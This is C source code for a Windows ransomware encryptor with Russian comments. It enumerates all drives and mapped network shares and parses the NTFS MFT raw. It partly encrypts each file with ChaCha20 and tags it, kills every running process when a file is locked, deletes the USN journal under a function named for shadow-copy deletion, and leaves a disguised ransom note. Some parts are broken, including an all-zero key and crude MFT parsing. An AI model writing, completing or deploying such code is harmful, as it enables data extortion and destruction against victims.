#include <windows.h>
#include <tlhelp32.h> // Для CreateToolhelp32Snapshot
#include <winioctl.h> // Для FSCTL_GET_NTFS_VOLUME_DATA
#include "crypto.h"
#include "utils.h"

// Определения структур NTFS
#define $FILE_NAME 0x30

typedef struct {
    DWORD RecordIdentifier;
    WORD AttributesOffset;
    DWORD RecordLength;
} FILE_RECORD_HEADER;

typedef struct {
    DWORD TypeIdentifier;
    DWORD RecordLength;
    BYTE FormCode;
    BYTE NameLength;
    WORD NameOffset;
    // Другие поля опустим для простоты
} ATTRIBUTE_RECORD_HEADER;

typedef struct {
    BYTE FileNameLength;
    WCHAR FileName[1]; // Переменная длина
} FILE_NAME_ATTRIBUTE;

static BYTE chacha_key[32] = { 0 };
static BYTE nonce[12] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
static const float stripe_percent[5] = { 2.0f, 1.0f, 0.6f, 0.6f, 0.6f };
static const char* note_text = "Тестирование файлов прошло успешно, проведите тестирование расшифровки";
static BOOL log_enabled = FALSE;
static HANDLE hLogFile = INVALID_HANDLE_VALUE;

void init_log() {
    if (log_enabled) {
        hLogFile = CreateFileA("encryptor.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    }
}

void log_message(const char* msg) {
    if (hLogFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hLogFile, msg, strlen(msg), &written, NULL);
        WriteFile(hLogFile, "\r\n", 2, &written, NULL);
    }
}

void encrypt_file(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 0);
                    CloseHandle(hProc);
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
        hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    if (fileSize.QuadPart < 16) { CloseHandle(hFile); return; }

    BYTE footer[16];
    SetFilePointer(hFile, -16, NULL, FILE_END);
    DWORD read;
    ReadFile(hFile, footer, 16, &read, NULL);
    if (memcmp(footer, "ENCRYPTED", 9) == 0) { CloseHandle(hFile); return; }

    float percent = stripe_percent[0];
    if (fileSize.QuadPart > 100 * 1024 * 1024) percent = stripe_percent[1];
    if (fileSize.QuadPart > 1024 * 1024 * 1024) percent = stripe_percent[2];
    if (fileSize.QuadPart > 100 * 1024 * 1024 * 1024) percent = stripe_percent[3];
    if (fileSize.QuadPart > 1024 * 1024 * 1024 * 1024) percent = stripe_percent[4];
    percent += ((float)(rand() % 1000) / 1000.0f - 0.5f) * 0.5f;

    BYTE* buffer = HeapAlloc(GetProcessHeap(), 0, fileSize.QuadPart);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, buffer, fileSize.QuadPart, &read, NULL);

    size_t encrypt_size = (size_t)(fileSize.QuadPart * percent / 100.0f);
    chacha20_encrypt(buffer, buffer, encrypt_size, chacha_key, nonce);
    memcpy(buffer + fileSize.QuadPart - 16, "ENCRYPTED", 9);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, buffer, fileSize.QuadPart, &read, NULL);
    HeapFree(GetProcessHeap(), 0, buffer);
    CloseHandle(hFile);

    char log_msg[512];
    sprintf_s(log_msg, sizeof(log_msg), "Encrypted: %s", path);
    log_message(log_msg);
}

DWORD WINAPI encrypt_thread(LPVOID param) {
    char* path = (char*)param;
    encrypt_file(path);
    HeapFree(GetProcessHeap(), 0, path);
    return 0;
}

void parse_mft(const char* drive) {
    char volume[MAX_PATH];
    sprintf_s(volume, sizeof(volume), "\\\\.\\%s", drive);
    HANDLE hVolume = CreateFileA(volume, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVolume == INVALID_HANDLE_VALUE) return;

    BYTE buffer[1024 * 1024];
    DWORD bytesReturned;
    if (!DeviceIoControl(hVolume, FSCTL_GET_NTFS_VOLUME_DATA, NULL, 0, buffer, sizeof(buffer), &bytesReturned, NULL)) {
        CloseHandle(hVolume);
        return;
    }

    NTFS_VOLUME_DATA_BUFFER* volData = (NTFS_VOLUME_DATA_BUFFER*)buffer;
    LARGE_INTEGER mftStart = volData->MftStartLcn;
    DWORD clusterSize = volData->BytesPerCluster;

    HANDLE hMft = CreateFileA(volume, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    LARGE_INTEGER offset;
    offset.QuadPart = mftStart.QuadPart * clusterSize;
    SetFilePointerEx(hMft, offset, NULL, FILE_BEGIN);

    BYTE mftBuffer[1024];
    while (ReadFile(hMft, mftBuffer, sizeof(mftBuffer), &bytesReturned, NULL) && bytesReturned > 0) {
        FILE_RECORD_HEADER* frh = (FILE_RECORD_HEADER*)mftBuffer;
        if (frh->RecordLength == 0) break;

        BYTE* attr = mftBuffer + frh->AttributesOffset;
        while (attr < mftBuffer + frh->RecordLength) {
            ATTRIBUTE_RECORD_HEADER* arh = (ATTRIBUTE_RECORD_HEADER*)attr;
            if (arh->TypeIdentifier == 0xFFFFFFFF) break;
            if (arh->TypeIdentifier == $FILE_NAME) {
                FILE_NAME_ATTRIBUTE* fna = (FILE_NAME_ATTRIBUTE*)(attr + arh->NameOffset);
                char path[MAX_PATH];
                sprintf_s(path, sizeof(path), "%s\\%S", drive, fna->FileName); // %S для WCHAR
                char* task_path = HeapAlloc(GetProcessHeap(), 0, strlen(path) + 1);
                strcpy_s(task_path, strlen(path) + 1, path);
                CreateThread(NULL, 0, encrypt_thread, task_path, 0, NULL);
            }
            attr += arh->RecordLength;
        }
    }

    CloseHandle(hMft);
    CloseHandle(hVolume);
    write_note(drive, note_text);
}

void scan_shares() {
    NETRESOURCEA nr = { 0 };
    HANDLE hEnum;
    WNetOpenEnumA(RESOURCE_GLOBALNET, RESOURCETYPE_DISK, 0, NULL, &hEnum);
    DWORD count = -1, buf_size = 16384;
    NETRESOURCEA* buffer = HeapAlloc(GetProcessHeap(), 0, buf_size);
    while (WNetEnumResourceA(hEnum, &count, buffer, &buf_size) == NO_ERROR) {
        for (DWORD i = 0; i < count; i++) {
            if (buffer[i].lpLocalName) parse_mft(buffer[i].lpLocalName);
        }
    }
    HeapFree(GetProcessHeap(), 0, buffer);
    WNetCloseEnum(hEnum);
}

void delete_shadow_copies() {
    HANDLE hVolume = CreateFileA("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVolume != INVALID_HANDLE_VALUE) {
        DWORD bytesReturned;
        DeviceIoControl(hVolume, FSCTL_DELETE_USN_JOURNAL, NULL, 0, NULL, 0, &bytesReturned, NULL);
        CloseHandle(hVolume);
    }
}

int main(int argc, char* argv[]) {
    srand(GetTickCount());
    init_log();
    delete_shadow_copies();

    if (argc > 1 && strcmp(argv[1], "-path") == 0 && argc > 2) {
        parse_mft(argv[2]);
    }
    else {
        char drive[4] = "C:";
        for (char c = 'A'; c <= 'Z'; c++) {
            drive[0] = c;
            if (GetDriveTypeA(drive) != DRIVE_NO_ROOT_DIR) parse_mft(drive);
        }
        scan_shares();
    }

    if (hLogFile != INVALID_HANDLE_VALUE) CloseHandle(hLogFile);
    secure_zero(chacha_key, sizeof(chacha_key));
    return 0;
}